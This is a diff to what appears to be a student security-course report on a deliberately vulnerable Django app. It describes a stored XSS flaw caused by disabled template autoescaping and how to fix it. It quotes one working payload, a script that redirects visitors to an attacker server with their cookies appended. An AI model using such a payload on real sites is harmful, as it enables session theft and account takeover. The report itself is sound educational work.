@@ -84,3 +84,34 @@ FLAW 2: Injection
     https://github.com/Pekk4/csb-project1/blob/064f72946d3ae241fec4aaf4c2fd479b7c275d2b/project/vulnerableApp/views.py#L43
     
     https://github.com/Pekk4/csb-project1/blob/064f72946d3ae241fec4aaf4c2fd479b7c275d2b/project/vulnerableApp/views.py#L27 (Example of using ORM instead of custom query)
+
+
+
+At this point I realized that I may have written too much text and thus from now on I will focus more on my application-specific things.
+
+
+
+FLAW 3: XSS
+
+  Link(s) to the flaw occurrence in code:
+
+    Link 1: https://github.com/Pekk4/csb-project1/blob/c2d233967f38b2849b7d76ad1d62d0af512fbc3d/project/vulnerableApp/templates/xssmessages.html#L1
+
+  Description
+
+    In the application there is a link in main page which directs user to the page, where they can see all of the messages in the application. Application has had a little careless developer
+    who has forgot to turn templates autoescaping back on after testing something with it off (link 1). Now that page is vulnerable to Cross-Site Scripting attacks and the attacker has noticed this.
+    The attacker has sent a message
+
+      <script>window.location.href = "http://localhost:9000/xss?"+document.cookie;</script>
+
+    into the application and now that vulnerable page directs users to attacker's server (found from project's attacker/ directory) which stoles their sessions and cookies and
+    then sends messages with their privileges in the app. This kind of XSS where it is stored in and then fetched from the persistent storage (database), is called as stored XSS (or persistent XSS).
+
+  Fixes
+
+    Once again a flaw which Django has built-in protection against and one needs to make an effort to get this flaw into their Django app. Anyway, removing autoescape off from the templates
+    prevents application to be vulnerable for XSS attacks, as with autoescaping Django sanitizes all the content rendered in templates and thus the malicious JavaScript will not be run when
+    the page is loaded.
+    
+    https://github.com/Pekk4/csb-project1/blob/aec735730bcf4cb9ff5e592f52b81356b73604b1/project/vulnerableApp/templates/xssmessages.html#L1
